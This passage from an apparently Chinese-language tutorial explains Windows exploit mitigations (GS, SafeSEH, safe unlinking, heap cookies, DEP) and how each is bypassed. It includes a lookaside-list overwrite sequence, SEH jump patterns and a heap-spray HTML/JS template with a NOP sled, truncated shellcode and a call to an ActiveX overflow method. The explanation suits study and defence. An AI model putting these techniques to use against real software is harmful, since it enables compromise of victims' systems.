&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mov   ecx,dword ptr [esp+20h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor   ecx,dword ptr [esp+24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;add   esp,24h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp   __security_check_cookie (4010B2h)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在缓冲区溢出利用时，如果将恶意代码从局部变量覆盖到返回地址，那么自然就会覆写cookie，当检测到与原始cookie不同时（也就是比较上面408040h与4010B2h两处cookie值的比较），就会触发异常，最后终止进程。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：&quot;&gt;&lt;a href=&quot;#绕过方法：&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-猜测-计算cookie&quot;&gt;&lt;a href=&quot;#1-猜测-计算cookie&quot; class=&quot;headerlink&quot; title=&quot;1.猜测/计算cookie&quot;&gt;&lt;/a&gt;1.猜测/计算cookie&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://www.uninformed.org/?v=7&amp;amp;a=2&amp;amp;t=html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Reducing the Effective Entropy of GS Cookies&lt;/a&gt;&lt;br&gt;至从覆盖SEH的方法出现后，这种方法目前已基本不用了，它没有后面的方法来得简便。&lt;/p&gt;
&lt;h4 id=&quot;2-覆盖SEH&quot;&gt;&lt;a href=&quot;#2-覆盖SEH&quot; class=&quot;headerlink&quot; title=&quot;2.覆盖SEH&quot;&gt;&lt;/a&gt;2.覆盖SEH&lt;/h4&gt;&lt;p&gt;由于当security_check_cookie（）函数检测到cookie被更改后，会检查是否安装了安全处理例程，也就是SEH节点中保存的指针，如果没有，那么由系统的异常处理器接管，因此我们可以通过（pop pop ret）覆盖SEH来达到溢出的目的。但对于受SafeSEH保护的模块，就可能会导致exploit失效，关于它的绕过在后续部分再述。&lt;br&gt;辅助工具：OD插件safeSEH、pattern_create、pattern_offset、msfpescan、memdump&lt;/p&gt;
&lt;h4 id=&quot;3-覆盖虚表指针&quot;&gt;&lt;a href=&quot;#3-覆盖虚表指针&quot; class=&quot;headerlink&quot; title=&quot;3.覆盖虚表指针&quot;&gt;&lt;/a&gt;3.覆盖虚表指针&lt;/h4&gt;&lt;p&gt;堆栈布局：[局部变量][cookie][入栈寄存器][返回地址][参数][虚表指针]&lt;br&gt;当把虚表指针覆盖后，由于要执行虚函数得通过虚表指针来搜索，即可借此劫持eip。&lt;/p&gt;
&lt;h2 id=&quot;二、SafeSEH&quot;&gt;&lt;a href=&quot;#二、SafeSEH&quot; class=&quot;headerlink&quot; title=&quot;二、SafeSEH&quot;&gt;&lt;/a&gt;二、SafeSEH&lt;/h2&gt;&lt;h3 id=&quot;原理-1&quot;&gt;&lt;a href=&quot;#原理-1&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;为了防止SEH节点被攻击者恶意利用，微软在．net编译器中加入/safeseh编译选项引入SafeSEH技术。编译器在编译时将PE文件所有合法的异常处理例程的地址解析出来制成一张表，放在PE文件的数据块(LQAJ)一C0N—FIG)中，并使用shareuser内存中的一个随机数加密，用于匹配检查。如果该PE文件不支持safeSEH，则表的地址为0。当PE文件被系统加载后，表中的内容被加密保存到ntdl1．dll模块的某个数据区。在PE文件运行期间，如果发生异常需要调用异常处理例程，系统会逐个检查该例程在表中是否有记录：如果没有则说明该例程非法，进而不执行该异常例程。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法&quot;&gt;&lt;a href=&quot;#绕过方法&quot; class=&quot;headerlink&quot; title=&quot;绕过方法&quot;&gt;&lt;/a&gt;绕过方法&lt;/h3&gt;&lt;h4 id=&quot;1-利用堆地址覆盖SEH结构&quot;&gt;&lt;a href=&quot;#1-利用堆地址覆盖SEH结构&quot; class=&quot;headerlink&quot; title=&quot;1.利用堆地址覆盖SEH结构&quot;&gt;&lt;/a&gt;1.利用堆地址覆盖SEH结构&lt;/h4&gt;&lt;p&gt;在禁用DEP的进程中，异常分发例程允许SEH handler位于某些非映像页面，除栈空间之外。这也就意味着我们可以把shellcode放置在堆中，并通过覆盖SEH跳至堆空间以执行shellcode，这样即可完全绕过safeseh保护。&lt;/p&gt;
&lt;h4 id=&quot;2-利用SafeSEH保护模块之外的地址&quot;&gt;&lt;a href=&quot;#2-利用SafeSEH保护模块之外的地址&quot; class=&quot;headerlink&quot; title=&quot;2.利用SafeSEH保护模块之外的地址&quot;&gt;&lt;/a&gt;2.利用SafeSEH保护模块之外的地址&lt;/h4&gt;&lt;p&gt;对于目前的大部分windows操作系统，其系统模块都受SafeSEH保护，可以选用未开启SafeSEH保护的模块来利用，比如漏洞软件本身自带的dll文件，这个可以借助OD插件SafeSEH来查看进程中各模块是否开启SafeSEH保护。除此之外，也可通过直接覆盖返回地址(jmp/call esp)来利用。另一种方法，如果esp +8 指向EXCEPTION_REGISTRATION 结构，那么你仍然可以寻找一个pop/pop/ret指令组合（在加载模块的地址范围之外的空间），也可以正常工作。但如果你在程序的加载模块中找不到pop/pop/ret 指令，你可以观察下esp/ebp,查看下这些寄存器距离nseh 的偏移，接下来就是查找这样的指令：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr[esp+nn] / jmp dword ptr[esp+nn]                                                                        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr[ebp+nn] / jmp dword ptr[ebp+nn] &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr[ebp-nn] / jmp dword ptr[ebp-nn]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(其中的nn 就是寄存器的值到nseh 的偏移，偏移nn可能是: esp+8, esp+14, esp+1c, esp+2c, esp+44, esp+50, ebp+0c, ebp+24, ebp+30, ebp-04, ebp-0c, ebp-18)。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果遇到以上指令是以NULL字节结尾的，可将shellcode放置在SEH之前：&lt;br&gt;• 在nseh 上放置向后的跳转指令（跳转7 字节：jmp 0xfffffff9）；&lt;br&gt;• 向后跳转足够长的地址以存放shellcode，并借此执行至shellcode；&lt;br&gt;• 把shellcode 放在用于覆盖异常处理结构的指令地址之前。&lt;/p&gt;
&lt;h2 id=&quot;三、Safe-Unlinking&quot;&gt;&lt;a href=&quot;#三、Safe-Unlinking&quot; class=&quot;headerlink&quot; title=&quot;三、Safe Unlinking&quot;&gt;&lt;/a&gt;三、Safe Unlinking&lt;/h2&gt;&lt;h3 id=&quot;原理-2&quot;&gt;&lt;a href=&quot;#原理-2&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在Windows XP SP2之后，堆分配器在从空闲链表中移除堆块时使用safe unlinking进行保护，防止堆溢出被利用。在使用flink和blink指针前，它会验证是否满足以下条件：Entry-&amp;gt;Flink-&amp;gt;Blink == Entry-&amp;gt;Blink-&amp;gt;Flink == Entry，以防止攻击者使flink或blink指向任意内存地址，进而消除在执行unlink操作时写入任意4字节数据的机会。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：-1&quot;&gt;&lt;a href=&quot;#绕过方法：-1&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-利用旁视列表（lookaside-list）&quot;&gt;&lt;a href=&quot;#1-利用旁视列表（lookaside-list）&quot; class=&quot;headerlink&quot; title=&quot;1.利用旁视列表（lookaside list）&quot;&gt;&lt;/a&gt;1.利用旁视列表（lookaside list）&lt;/h4&gt;&lt;p&gt;旁视列表（《软件调试》），也叫快表（《0day安全：软件漏洞分析技术》），它是一张链表，共包含128 项，每一项对应于一个单向链表。每个单向链表都包含了一组固定大小的空闲块，堆块的大小从16 字节开始随索引递增依次增加8字节。最后一个索引（127）包含了大小为1024 字节的空闲堆块。每个堆块包含了8 个字节的块首，用于管理这个堆块。返回给调用者的最小堆块是16 字节。这样，旁视列表前端分配器没有使用索引为0的项，因为这个项对应于大小为8 个字节的空闲堆块。由于在safe unlinking过程中，快表被忽略了，当在快表中分配一块空闲块后，若将该空闲块从链表中移除，则该块的flink指针会写入块首，而系统并未对flink指针的有效性进行验证，这样就导致在分配下一个同大小的堆块时，它将会把flink指针返回给新分配的块。如果攻击者能够覆盖快表中的链表头，那么就可以用任意地址来替换flink指针，并在分配新块时写入任意字节，最后返回被我们修改的地址的值。这一攻击方式最早是由Matt Conover在CanSecWest 2004黑客大会上公布的&lt;a href=&quot;http://cybertech.net/~sh0ksh0k/projects/winheap/XPSP2%20Heap%20Exploitation.ppt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Windows Heap ExploitationWin2KSP0 through WinXPSP2)》&lt;/a&gt;&lt;br&gt;实现步骤如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;p = HeapAlloc(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FillLookaside(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HeapFree(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EmptyLookaside(n);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用以下值篡改 p[0]（任一堆地址）:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;p-&amp;gt;Flags = Busy (防止偶然发生堆块合并)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p -&amp;gt;Flink = (BYTE *)&amp;amp;ListHead[(n/&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] - &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p -&amp;gt;Blink = (BYTE *)&amp;amp;ListHead[(n/&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HeapAlloc(n); &lt;span class=&quot;comment&quot;&gt;// 破坏 safe unlinking &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = HeapAlloc(n); &lt;span class=&quot;comment&quot;&gt;// 破坏 safe unlinking&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 现在p指向 &amp;amp;ListHead[(n/8)].Blink&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但在Windows Vista之后，快表被低碎片堆（Low-Fragmentation Heap）所代替了，上面的攻击方式就不再适用了。&lt;/p&gt;
&lt;h4 id=&quot;2-heap-spary&quot;&gt;&lt;a href=&quot;#2-heap-spary&quot; class=&quot;headerlink&quot; title=&quot;2.heap spary&quot;&gt;&lt;/a&gt;2.heap spary&lt;/h4&gt;&lt;p&gt;Heap Spary技术最早是由SkyLined于2004年为IE的iframe漏洞写的exploit而使用到新技术，目前主要作为浏览器攻击的经典方法，被大量网马所使用。Heap Spary技术是使用js分配内存，所分配的内存均放入堆中，然后用各带有shellcode的堆块去覆盖一大片内存地址，Javascript分配内存从低址向高址分配，申请的内存空间超出了200M，即大于了0x0C0C0C0C时，0x0C0C0C0C就会被覆盖掉，因此只要让IE执行到0x0C0C0C0C（有时也会用0x0D0D0D0D这一地址）就可以执行shellcode，这些堆块可以用NOP + shellcode 来填充，每块堆构造1M大小即可，当然这也不是固定。这样当nop区域命中0x0c0c0c0c时，就可执行在其后面的shellcode。下面是一个简单模板：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;object classid=&quot;clsid:6BE52E1D-E586-474F-A6E2-1A85A9B4D9FB&quot; id=&quot;target&quot;&amp;gt;&amp;lt;/object&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Var shellcode=&quot;\u68fc\u7473\u6668\u6961……\u53c4\u5050\uff53\ufc57\uff53\uf857&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var nop=&quot;\u9090\u9090&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;while (nop.length &amp;lt;= 0x100000/2)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        nop+=nop;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nop = nop.substring(0,0x100000/2-32/2-4/2-shellcode.length-2/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var slide = new Array();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for ( var i=0; i&amp;lt;200; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        slide[i] = nop + shellcode;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var s= &#39;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;while (s.length &amp;lt; 748)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s+=&quot;\x0c&quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target.Overflow(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;四、Heap-Cookie及其加密&quot;&gt;&lt;a href=&quot;#四、Heap-Cookie及其加密&quot; class=&quot;headerlink&quot; title=&quot;四、Heap Cookie及其加密&quot;&gt;&lt;/a&gt;四、Heap Cookie及其加密&lt;/h2&gt;&lt;h3 id=&quot;原理-3&quot;&gt;&lt;a href=&quot;#原理-3&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在heap header中加入cookie值，原理与栈中的cookie类似，用于检测堆溢出的发生，cookie被放置在堆首部分原堆块的segment table的位置，占1字节大小，其计算公式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(AddressOfChunkHeader / &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) XOR Heap-&amp;gt;Cookie = Cookie&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;即堆块头部地址除以8，然后跟Heap管理结构中的cookie相异或就得到了cookie值。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法-1&quot;&gt;&lt;a href=&quot;#绕过方法-1&quot; class=&quot;headerlink&quot; title=&quot;绕过方法&quot;&gt;&lt;/a&gt;绕过方法&lt;/h3&gt;&lt;h4 id=&quot;1-猜测-计算cookie-1&quot;&gt;&lt;a href=&quot;#1-猜测-计算cookie-1&quot; class=&quot;headerlink&quot; title=&quot;1.猜测/计算cookie&quot;&gt;&lt;/a&gt;1.猜测/计算cookie&lt;/h4&gt;&lt;p&gt;由于cookie只有1字节，因此共有256种可能存在的值，如果通过暴力猜测的话，也是存在被破解的可能。&lt;/p&gt;
&lt;h4 id=&quot;2-heap-spary-1&quot;&gt;&lt;a href=&quot;#2-heap-spary-1&quot; class=&quot;headerlink&quot; title=&quot;2.heap spary&quot;&gt;&lt;/a&gt;2.heap spary&lt;/h4&gt;&lt;p&gt;具体利用方法同上，这里不再赘述。&lt;/p&gt;
&lt;h2 id=&quot;三、DEP&quot;&gt;&lt;a href=&quot;#三、DEP&quot; class=&quot;headerlink&quot; title=&quot;三、DEP&quot;&gt;&lt;/a&gt;三、DEP&lt;/h2&gt;&lt;h3 id=&quot;原理-4&quot;&gt;&lt;a href=&quot;#原理-4&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;数据执行保护 (DEP) 是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码。在 Microsoft Windows XP Service Pack 2、 Microsoft Windows Server 2003 Service Pack 1 、Microsoft Windows XP Tablet PC Edition 2005 、Microsoft Windows Vista 和 windows 7 中，由硬件和软件一起强制实施 DEP。DEP 有两种模式，如果CPU 支持内存页NX 属性， 就是硬件支持的DEP。只有当处理器/系统支持NX/XD位（禁止执行）时，windows才能拥有硬件DEP，否则只能支持软件DEP，相当于只有SafeSEH保护。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：-2&quot;&gt;&lt;a href=&quot;#绕过方法：-2&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-ret2lib&quot;&gt;&lt;a href=&quot;#1-ret2lib&quot; class=&quot;headerlink&quot; title=&quot;1.ret2lib&quot;&gt;&lt;/a&gt;1.ret2lib&lt;/h4&gt;&lt;p&gt;其思路为：将返回地址指向lib库中的代码，而不直接跳转到shellcode 去执行，进而实现恶意代码的运行。可以在库中找到一段执行系统命令的代码，比如system()函数，用它的地址覆盖返回地址，此时即使NX/XD 禁止在堆栈上执行代码，但库中的代码依然是可以执行的。函数system()可通过运行环境来执行其它程序，例如启动Shell等等。另外，还可以通过VirtualProtect函数来修改恶意代码所在内存页面的执行权限，然后再将控制转移到恶意代码，其堆栈布局如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┓      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃            恶意代码              ┃内存高地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃        lpflOldProtect            ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃          flNewProtect            ┃┃栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃       调用参数         ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃             dwSize               ┃┃生&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃            lpAddress             ┃┃长&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃      恶意代码的入口地址          ┃┃方&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃      返回地址          ┃    VirtualProtect函数地址        ┃┃向&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃ EBP上层函数堆栈基址   ┃                                  ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━┫                                  ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃ 异常例程入口地址（若有 ┃　    填充数据的覆盖区域          ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃设置的话,比如try…catch)┃       （AAAAAAAA……）           ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━┫                                  ┃▼&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃      局部变量          ┃                                  